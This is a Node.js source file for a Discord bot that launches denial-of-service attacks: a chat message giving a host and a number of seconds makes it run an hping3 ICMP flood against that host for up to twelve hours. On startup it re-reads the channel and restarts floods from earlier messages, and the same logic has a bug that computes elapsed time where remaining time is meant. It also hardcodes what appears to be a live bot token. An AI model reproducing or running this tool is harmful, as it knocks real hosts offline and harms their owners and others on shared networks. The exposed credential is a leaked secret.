const childProcess = require('child_process')
const Discord = require('discord.js')

const client = new Discord.Client()

const MAX_BOOT_TIME = 43200

function parseMessage(msg) {
  if (msg.content) {
    if (msg.content.match(/^[A-Za-z0-9\.]+ [0-9]+$/)) {
      const split = msg.content.split(' ')
      const ip = split[0]
      const time = Number(split[1])
      if (time > 43200) {
        msg.react('🚫')
        return undefined
      }
      return { ip, time }
    }
  }
  msg.react('🚫')
  return undefined
}

client.on('message', (msg) => {
  const parsed = parseMessage(msg)
  if (parsed) {
    msg.react('🕒')
    boot(parsed.ip, parsed.time, msg)
  }
})

client.on('ready', async () => {
  const channel = client.channels.get('355820607495208961')
  const messages = (await channel.fetchMessages()).array()
  for (const msg of messages) {
    const parsed = parseMessage(msg)
    if (parsed) {
      const timeLeft = Date.now() - msg.createdTimestamp
      if (timeLeft < parsed.time * 1000) {
        boot(parsed.ip, timeLeft / 1000, msg)
      }
    }
  }
})

function boot(ip, time, msg) {
  console.log(`boot ${ip} ${time}`)
  const process = childProcess.spawn('sudo', ['hping3' ,'--flood', '--icmp', '--data', '55555', ip])
  setTimeout(() => { 
    childProcess.exec(`sudo kill -9 ${process.pid}`)
    msg.react('✅')
  }, time * 1000)
}

setInterval(() => {
  console.log('hello')
}, 60000)

client.login('MzU1ODIwOTg4NjM1NTQ1NjAy.DJSXpg.lK4qe_F7iFwyTUhwrYRQR9IeYUc')